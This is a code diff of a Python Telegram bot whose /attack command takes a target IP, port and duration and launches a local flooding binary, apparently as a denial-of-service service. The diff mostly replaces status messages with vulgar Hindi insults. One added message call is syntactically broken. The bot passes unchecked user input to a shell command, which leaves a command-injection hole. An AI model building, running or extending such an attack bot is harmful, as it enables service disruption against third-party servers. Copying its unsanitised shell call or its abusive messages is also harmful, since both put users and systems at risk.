@@ -65,19 +65,19 @@ def handle_attack(message):
         return
 
     if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"❗ **𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐉𝐎𝐈𝐍 𝐊𝐑𝐎 𝐏𝐄𝐇𝐋𝐄** {CHANNEL_USERNAME} 🔥")
+        bot.reply_to(message, f"❗ **BSDK MC CHANNEL TERA BAAP JOIN KRGA** {CHANNEL_USERNAME} 🔥")
         return
 
     if pending_feedback.get(user_id, False):
-        bot.reply_to(message, "😡 **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄 𝐏𝐄𝐇𝐋𝐄!** 🔥")
+        bot.reply_to(message, "😡 **LAUDE SCREENSHOT PEHLE DE FIR AANA!** 🔥")
         return
 
     if is_attack_running:
-        bot.reply_to(message, "⚠️ **𝐀𝐋𝐑𝐄𝐀𝐃𝐘 𝐀𝐍 𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐒 𝐑𝐔𝐍𝐍𝐈𝐍𝐆! 𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓.**")
+        bot.reply_to(message, "⚠️ **CHUDAI PAHLE SE HI CHALU HAI! BSDK WAIT.**")
         return
 
     if len(command) != 4:
-        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /attack `<IP>` `<PORT>` `<TIME>`")
+        bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /RS  <IP>  <PORT>  <TIME> ")
         return
 
     target, port, time_duration = command[1], command[2], command[3]
@@ -97,8 +97,12 @@ def handle_attack(message):
     is_attack_running = True
     pending_feedback[user_id] = True  # Require screenshot
 
-    bot.send_message(message.chat.id, f"🚀 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!**\n🎯 `{target} : {port}`\n⏳ {time_duration}s")
-
+    bot.send_message(message.chat.id, 👤 **User:** @{user_name} 🚀\n"
+                                                        f"💥 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!** 💥\n"
+                                                        f"🎯 **𝐓𝐀𝐑𝐆𝐄𝐓:** `{target} : {port}`\n"
+                                                        f"⏳ **𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍:** {time_duration}𝙨\n"
+                                                        f"⚡ **𝐑𝐄𝐌𝐀𝐈𝐍𝐈𝐍𝐆 𝐀𝐓𝐓𝐀𝐂𝐊𝐒:** {remaining_attacks}\n"
+                                                        f"📸 **𝐆𝐀𝐌𝐄 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐁𝐇𝐄𝐉 𝐃𝐄!**\n"
     try:
         subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
     except subprocess.CalledProcessError as e:
@@ -106,7 +110,7 @@ def handle_attack(message):
         is_attack_running = False  # Reset flag
         return
 
-    bot.send_message(message.chat.id, "✅ **𝐀𝐓𝐓𝐀𝐂𝐊 𝐃𝐎𝐍𝐄! 𝐀𝐁 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄!** 🚀")
+    bot.send_message(message.chat.id, "✅ **CHUDAI FINISHED ! 𝐀𝐁 𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄!** 🚀")
 
     is_attack_running = False  # Reset flag after attack completes
 
